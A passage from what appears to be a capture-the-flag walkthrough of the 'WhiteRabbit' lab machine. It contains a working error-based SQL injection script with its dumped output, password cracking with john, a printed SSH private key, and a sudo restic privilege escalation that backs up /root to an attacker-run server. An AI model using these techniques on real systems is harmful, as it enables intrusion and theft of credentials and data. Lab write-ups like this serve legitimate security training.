    <span class="n">db</span><span class="o">=</span><span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="o">=</span><span class="n">table</span><span class="p">,</span> <span class="n">column</span><span class="o">=</span><span class="n">column</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
            <span class="n">data_rows</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">data_rows</span>

<span class="k">def</span> <span class="nf">extract_all_data</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">table</span><span class="p">,</span> <span class="n">column</span><span class="p">):</span>
    <span class="n">data_rows</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">id_val</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">):</span>
        <span class="n">row_data</span> <span class="o">=</span> <span class="sh">""</span>
        <span class="n">chunk_size</span> <span class="o">=</span> <span class="mi">18</span>
        <span class="n">pos</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">payload_template</span> <span class="o">=</span> <span class="p">(</span>
                <span class="sa">r</span><span class="sh">'</span><span class="s">\" OR updatexml(1,concat(0x7e,(</span><span class="sh">'</span>
                <span class="sa">r</span><span class="sh">'</span><span class="s">select SUBSTRING({column}, {pos}, {chunk_size}) </span><span class="sh">'</span>
                <span class="sa">r</span><span class="sh">'</span><span class="s">from temp.{table} where id={id_val}</span><span class="sh">'</span>
                <span class="sa">r</span><span class="sh">'</span><span class="s">),0x7e),1) -- </span><span class="sh">'</span>
            <span class="p">)</span>
            <span class="n">data</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span>
                <span class="n">url</span><span class="p">,</span>
                <span class="n">payload_template</span><span class="p">,</span>
                <span class="n">rhost</span><span class="p">,</span>
                <span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span>
                <span class="n">chunk_size</span><span class="o">=</span><span class="n">chunk_size</span><span class="p">,</span>
                <span class="n">id_val</span><span class="o">=</span><span class="n">id_val</span><span class="p">,</span>
                <span class="n">table</span><span class="o">=</span><span class="n">table</span><span class="p">,</span>
                <span class="n">column</span><span class="o">=</span><span class="n">column</span><span class="p">,</span> 
            <span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">row_data</span> <span class="o">+=</span> <span class="n">data</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">chunk_size</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">pos</span> <span class="o">+=</span> <span class="n">chunk_size</span>
        <span class="k">if</span> <span class="n">row_data</span><span class="p">.</span><span class="nf">strip</span><span class="p">():</span>
            <span class="n">data_rows</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">id_val</span><span class="p">,</span> <span class="n">row_data</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] No data for id </span><span class="si">{</span><span class="n">id_val</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">data_rows</span>

<span class="k">def</span> <span class="nf">perform_sql_injection</span><span class="p">(</span><span class="n">rhost</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[i] Performing SQL injection...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s">/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d</span><span class="sh">"</span>
    <span class="n">databases</span> <span class="o">=</span> <span class="nf">extract_databases</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">databases</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] No databases found.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">for</span> <span class="n">db</span> <span class="ow">in</span> <span class="n">databases</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Got database: </span><span class="si">{</span><span class="n">db</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">db</span> <span class="o">==</span> <span class="sh">"</span><span class="s">phishing</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">tables</span> <span class="o">=</span> <span class="nf">extract_tables</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">tables</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] No tables found for database </span><span class="si">{</span><span class="n">db</span><span class="si">}</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
                <span class="k">continue</span>
            <span class="k">for</span> <span class="n">table</span> <span class="ow">in</span> <span class="n">tables</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Got table: </span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[i] Extracting Columns...</span><span class="sh">"</span><span class="p">)</span>
                <span class="n">columns</span> <span class="o">=</span> <span class="nf">extract_columns</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="p">)</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">columns</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] No columns found for table </span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="s"> in database </span><span class="si">{</span><span class="n">db</span><span class="si">}</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
                    <span class="k">continue</span>
                <span class="k">for</span> <span class="n">column</span> <span class="ow">in</span> <span class="n">columns</span><span class="p">:</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Got column: </span><span class="si">{</span><span class="n">column</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[i] Extracting Data...</span><span class="sh">"</span><span class="p">)</span>
                    <span class="n">rows</span> <span class="o">=</span> <span class="nf">extract_all_data</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">table</span><span class="p">,</span> <span class="n">column</span><span class="p">)</span>
                    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">rows</span><span class="p">:</span>
                        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] </span><span class="si">{</span><span class="n">row</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">rhost</span> <span class="o">=</span> <span class="sh">"</span><span class="s">10.10.11.63</span><span class="sh">"</span>
    <span class="nf">perform_sql_injection</span><span class="p">(</span><span class="n">rhost</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>python3 sql_injection.py
<span class="o">[</span>i] Performing SQL injection...
<span class="o">[</span>+] Got database: phishing
<span class="o">[</span>+] Got database: temp
<span class="o">[</span>+] Got table: command_log
<span class="o">[</span>i] Extracting Columns...
<span class="o">[</span>+] Got column: <span class="nb">id</span>
<span class="o">[</span>i] Extracting Data...
<span class="o">[</span>+] <span class="o">(</span>1, <span class="s1">'1'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>2, <span class="s1">'2'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>3, <span class="s1">'3'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>4, <span class="s1">'4'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>5, <span class="s1">'5'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>6, <span class="s1">'6'</span><span class="o">)</span>
<span class="o">[</span>+] Got column: <span class="nb">command</span>
<span class="o">[</span>i] Extracting Data...
<span class="o">[</span>+] <span class="o">(</span>1, <span class="s1">'uname -a'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>2, <span class="s1">'restic init --repo rest:http://75951e6ff.whiterabbit.htb'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>3, <span class="s1">'echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>4, <span class="s1">'rm -rf .bash_history '</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>5, <span class="s1">'#thatwasclose'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>6, <span class="s1">'cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd'</span><span class="o">)</span>
<span class="o">[</span>+] Got column: <span class="nb">date</span>
<span class="o">[</span>i] Extracting Data...
<span class="o">[</span>+] <span class="o">(</span>1, <span class="s1">'2024-08-30 10:44:01'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>2, <span class="s1">'2024-08-30 11:58:05'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>3, <span class="s1">'2024-08-30 11:58:36'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>4, <span class="s1">'2024-08-30 11:59:02'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>5, <span class="s1">'2024-08-30 11:59:47'</span><span class="o">)</span>
<span class="o">[</span>+] <span class="o">(</span>6, <span class="s1">'2024-08-30 14:40:42'</span><span class="o">)</span>

</code></pre></div></div>

<p>We can see form the output, we extracted two database names phishing and temp . Within the temp database we extracted a table called command_log . Within the command_log table there were three columns called id , command , and date . When extracting the data, we see that a restic server was started with a restic password, the bash history file was removed, and that the user’s password was changed using a custom password generator at 2024-08-30 14:40:42 .</p>

<p><strong>Restic</strong></p>
<hr />

<p>To connect to the restic server, we first specify the repository, then check the snapshots.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span><span class="nb">export </span><span class="nv">RESTIC_REPOSITORY</span><span class="o">=</span><span class="s2">"rest:http://75951e6ff.whiterabbit.htb"</span>

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>restic snapshots                                                
enter password <span class="k">for </span>repository: 
repository 5b26a938 opened <span class="o">(</span>version 2, compression level auto<span class="o">)</span>
created new cache <span class="k">in</span> /home/kali/.cache/restic
ID        Time                 Host         Tags        Paths
<span class="nt">------------------------------------------------------------------------</span>
272cacd5  2025-03-07 05:48:40  whiterabbit              /dev/shm/bob/ssh
<span class="nt">------------------------------------------------------------------------</span>
1 snapshots

</code></pre></div></div>

<p>To extract the data, I first created a folder called restored , and then performed the following commands to identify the presence of a 7z archive with the SSH keys for the bob user.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir </span>restored
<span class="nv">$ </span>restic restore 272cacd5 <span class="nt">--target</span> restored
enter password <span class="k">for </span>repository: 

repository 5b26a938 opened <span class="o">(</span>version 2, compression level auto<span class="o">)</span>
<span class="o">[</span>0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of <span class="o">[</span>/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 <span class="nt">-0700</span> <span class="nt">-0700</span> by ctrlzero@whiterabbit to restored
Summary: Restored 5 files/dirs <span class="o">(</span>572 B<span class="o">)</span> <span class="k">in </span>0:00

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> restored/dev/shm/bob/ssh  
total 12
drwxr-xr-x 2 kali kali 4096 Mar  7  2025 <span class="nb">.</span>
drwxr-xr-x 3 kali kali 4096 Mar  7  2025 ..
<span class="nt">-rw-r--r--</span> 1 kali kali  572 Mar  7  2025 bob.7z

7z x restored/dev/shm/bob/ssh/bob.7z

7-Zip 25.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2025 Igor Pavlov : 2025-08-03
 64-bit <span class="nv">locale</span><span class="o">=</span>en_IN Threads:128 OPEN_MAX:1024, ASM

Scanning the drive <span class="k">for </span>archives:
1 file, 572 bytes <span class="o">(</span>1 KiB<span class="o">)</span>

Extracting archive: restored/dev/shm/bob/ssh/bob.7z
<span class="nt">--</span>
Path <span class="o">=</span> restored/dev/shm/bob/ssh/bob.7z
Type <span class="o">=</span> 7z
Physical Size <span class="o">=</span> 572
Headers Size <span class="o">=</span> 204
Method <span class="o">=</span> LZMA2:12 7zAES
Solid <span class="o">=</span> +
Blocks <span class="o">=</span> 1

    
Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
ERROR: Data Error <span class="k">in </span>encrypted file. Wrong password? : bob
ERROR: Data Error <span class="k">in </span>encrypted file. Wrong password? : bob.pub
ERROR: Data Error <span class="k">in </span>encrypted file. Wrong password? : config
             
Sub items Errors: 3

Archives with Errors: 1

Sub items Errors: 3 
</code></pre></div></div>

<p>When trying to extract bob user’s backup, we notice that there is a password that’s required to extract the 7z zip file. We attempt to crack the password with the following steps:</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z2john restored/dev/shm/bob/ssh/bob.7z <span class="o">&gt;</span> hash.txt
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes

<span class="nv">$ </span>john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>7z, 7-Zip archive encryption <span class="o">[</span>SHA256 256/256 AVX2 8x AES]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 524288 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>padding size<span class="o">)</span> is 3 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>compression <span class="nb">type</span><span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 4 <span class="o">(</span>data length<span class="o">)</span> is 365 <span class="k">for </span>all loaded hashes
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:22 0.02% <span class="o">(</span>ETA: 2025-12-17 20:08<span class="o">)</span> 0g/s 151.4p/s 151.4c/s 151.4C/s serendipity..lakers1
0g 0:00:01:56 0.07% <span class="o">(</span>ETA: 2025-12-18 10:22<span class="o">)</span> 0g/s 104.5p/s 104.5c/s 104.5C/s october31..Blink182
1q2w3e4r5t6y     <span class="o">(</span>bob.7z<span class="o">)</span>     
1g 0:00:04:01 DONE <span class="o">(</span>2025-12-16 12:47<span class="o">)</span> 0.004141g/s 98.86p/s 98.86c/s 98.86C/s 231086..100284
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<p>Now after cracking the password, we can extract the zip contents.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>7z x restored/dev/shm/bob/ssh/bob.7z

7-Zip 25.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2025 Igor Pavlov : 2025-08-03
 64-bit <span class="nv">locale</span><span class="o">=</span>en_IN Threads:128 OPEN_MAX:1024, ASM

Scanning the drive <span class="k">for </span>archives:
1 file, 572 bytes <span class="o">(</span>1 KiB<span class="o">)</span>

Extracting archive: restored/dev/shm/bob/ssh/bob.7z
<span class="nt">--</span>
Path <span class="o">=</span> restored/dev/shm/bob/ssh/bob.7z
Type <span class="o">=</span> 7z
Physical Size <span class="o">=</span> 572
Headers Size <span class="o">=</span> 204
Method <span class="o">=</span> LZMA2:12 7zAES
Solid <span class="o">=</span> +
Blocks <span class="o">=</span> 1

    
Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
Everything is Ok

Files: 3
Size:       557
Compressed: 572

</code></pre></div></div>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>bob    
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
<span class="nv">FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ</span><span class="o">=</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----

</code></pre></div></div>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>600 bob

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>ssh bob@whiterabbit.htb <span class="nt">-p2222</span> <span class="nt">-i</span> bob          
The authenticity of host <span class="s1">'[whiterabbit.htb]:2222 ([10.10.11.63]:2222)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is: SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="o">[</span>whiterabbit.htb]:2222<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the '</span>unminimize<span class="s1">' command.
Last login: Tue Dec 16 00:08:54 2025 from 10.10.14.4
bob@ebdce80611e9:~$ 

</span></code></pre></div></div>

<p>With this SSH key, we can successfully gain access to a docker container which has an SSH server running that has been mapped to port 2222 of the target.</p>

<p>Checking for excessive permissions in the container, we can see that the bob user can execute
/usr/bin/restic as any user without a password.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@ebdce80611e9:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>bob on ebdce80611e9:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/restic
bob@ebdce80611e9:~<span class="err">$</span>
</code></pre></div></div>

<p>There is a simple <code class="language-plaintext highlighter-rouge">GTFOBins</code> for restic we can use to escalate to the root user in the container found <a href="https://gtfobins.github.io/gtfobins/restic/#sudo">here</a> . To perform the exploitation, we will need to start a local restic server, then create a repository on the server to perform a backup against the /root directory. We can then extract the snapshot and recover the contents of the backup.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span><span class="nb">mkdir </span>data 

<span class="nb">sudo </span>docker run <span class="nt">--rm</span> <span class="nt">-p</span> 8000:8000 <span class="nt">-v</span> ./data:/data <span class="nt">--name</span> rest_server <span class="nt">-e</span> <span class="s2">"DISABLE_AUTHENTICATION=true"</span> restic/rest-server 
Unable to find image <span class="s1">'restic/rest-server:latest'</span> locally
latest: Pulling from restic/rest-server
fe07684b16b8: Pull <span class="nb">complete 
</span>e94f344ccc89: Pull <span class="nb">complete 
</span>507b4e466d26: Pull <span class="nb">complete 
</span>90feee258b6e: Pull <span class="nb">complete 
</span>64c7c029dfa9: Pull <span class="nb">complete 
</span>edba3cafd745: Pull <span class="nb">complete 
</span>Digest: sha256:d2aff06f47eb38637dff580c3e6bce4af98f386c396a25d32eb6727ec96214a5
Status: Downloaded newer image <span class="k">for </span>restic/rest-server:latest
Data directory: /data
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on <span class="o">[</span>::]:8000
Creating repository directories <span class="k">in</span> /data/temp
</code></pre></div></div>

<p>with our server listening we created a repository from the target :</p>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/restic init <span class="nt">-r</span> <span class="s2">"rest:http://10.10.16.92:8000/temp"</span>
enter password <span class="k">for </span>new repository: 
enter password again: 
created restic repository 3b3a1cb340 at rest:http://10.10.16.92:8000/temp/

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.

</code></pre></div></div>

<p>At this stage, we create a backup of the /root directory into our new temp repository.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/restic backup <span class="nt">-r</span> <span class="s2">"rest:http://10.10.16.92:8000/temp"</span>  /root/
enter password <span class="k">for </span>repository: 
repository 3b3a1cb3 opened <span class="o">(</span>version 2, compression level auto<span class="o">)</span>
created new cache <span class="k">in</span> /root/.cache/restic
no parent snapshot found, will <span class="nb">read </span>all files
<span class="o">[</span>0:02]          0 index files loaded

Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB <span class="o">(</span>3.602 KiB stored<span class="o">)</span>

processed 4 files, 3.865 KiB <span class="k">in </span>0:17
snapshot 1b6fb028 saved

</code></pre></div></div>

<p>Now, we can extract the contents on our machine locally.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span><span class="nb">mkdir </span>root                                                                   

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>restic restore 1b6fb028 <span class="nt">-r</span> <span class="s2">"rest:http://10.10.16.92:8000/temp"</span> <span class="nt">--target</span> root
enter password <span class="k">for </span>repository: 
repository 3b3a1cb3 opened <span class="o">(</span>version 2, compression level auto<span class="o">)</span>
created new cache <span class="k">in</span> /home/kali/.cache/restic
<span class="o">[</span>0:00] 100.00%  1 / 1 index files loaded
restoring snapshot 1b6fb028 of <span class="o">[</span>/root] at 2025-12-16 07:49:15.376873356 +0000 UTC by root@ebdce80611e9 to root
Summary: Restored 8 files/dirs <span class="o">(</span>3.865 KiB<span class="o">)</span> <span class="k">in </span>0:00

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> root/root
total 32
drwx------ 4 kali kali 4096 Dec 16 13:19 <span class="nb">.</span>
drwxrwxr-x 3 kali kali 4096 Dec 16 13:51 ..
lrwxrwxrwx 1 kali kali    9 Mar 24  2025 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 kali kali 3106 Apr 22  2024 .bashrc
drwx------ 2 kali kali 4096 Dec 16 13:19 .cache
<span class="nt">-rw-------</span> 1 kali kali  505 Aug 30  2024 morpheus
<span class="nt">-rw-r--r--</span> 1 kali kali  186 Aug 30  2024 morpheus.pub
<span class="nt">-rw-r--r--</span> 1 kali kali  161 Apr 22  2024 .profile
drwx------ 2 kali kali 4096 Aug 30  2024 .ssh

</code></pre></div></div>

<p>Now we have a SSH key for the <code class="language-plaintext highlighter-rouge">morpheus</code>  user, let’s attempt to authenticate to the host with this key via SSH.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>ssh morpheus@whiterabbit.htb <span class="nt">-i</span> root/root/morpheus                                                                       
The authenticity of host <span class="s1">'whiterabbit.htb (10.10.11.63)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is: SHA256:F9XNz/rgt655Q1XKkL6at11Zy5IXAogAEH95INEOrIE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>whiterabbit.htb<span class="s1">' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the '</span>unminimize<span class="s1">' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 16 07:55:51 2025 from 10.10.16.92
morpheus@whiterabbit:~$ ls -la user.txt
-rw-r----- 1 root morpheus 33 Dec 15 19:31 user.txt
morpheus@whiterabbit:~$ 

</span></code></pre></div></div>

<p>Now we can successfully obtain the <code class="language-plaintext highlighter-rouge">user.txt</code> from <code class="language-plaintext highlighter-rouge">/home/morpheus/user.txt</code> .</p>

<p><strong>Privilege Escalation</strong></p>
<hr />

<p>Thinking back to the <code class="language-plaintext highlighter-rouge">command_log</code> extraction, we saw that the <code class="language-plaintext highlighter-rouge">neo</code> user had changed their password. We can also see on the target that the <code class="language-plaintext highlighter-rouge">neo</code> user is part of the <code class="language-plaintext highlighter-rouge">sudo</code> group which makes him a high value target.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/neo-password-generator/neo-password-generator
<span class="nt">-rwxr-xr-x</span> 1 root root 15656 Aug 30  2024 /opt/neo-password-generator/neo-password-generator
morpheus@whiterabbit:~<span class="nv">$ </span><span class="nb">groups </span>neo
neo : neo <span class="nb">sudo</span>
</code></pre></div></div>

<p>We need to extract the <strong>neo-password-generator binary</strong> and <code class="language-plaintext highlighter-rouge">decompile</code> it locally. We can use <code class="language-plaintext highlighter-rouge">scp</code> to download the file with the private key we have for the <code class="language-plaintext highlighter-rouge">morpheus</code> user.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp <span class="nt">-i</span> root/root/morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator <span class="nb">.</span>
neo-password-generator                                                                                                                                     100%  15KB   5.1KB/s   00:03    
</code></pre></div></div>

<p><strong>Decompilation</strong></p>
<hr />

<p>Now we import the binary into <code class="language-plaintext highlighter-rouge">Ghidra</code> and begin analysing the structure of the <code class="language-plaintext highlighter-rouge">ELF binary</code> . Taking a look at the <code class="language-plaintext highlighter-rouge">main</code> function, we see the following:</p>

<p><img src="/assets/Pasted%20image%2020251216142550.png" alt="Pasted image 20251216142550.png" /></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
	<span class="n">timeval</span> <span class="n">local_28</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
	
	
	<span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
	<span class="n">gettimeofday</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">,(</span><span class="n">__timezone_ptr_t</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
	<span class="n">generate_password</span><span class="p">(</span><span class="n">local_28</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">*</span> <span class="mi">1000</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">);</span>
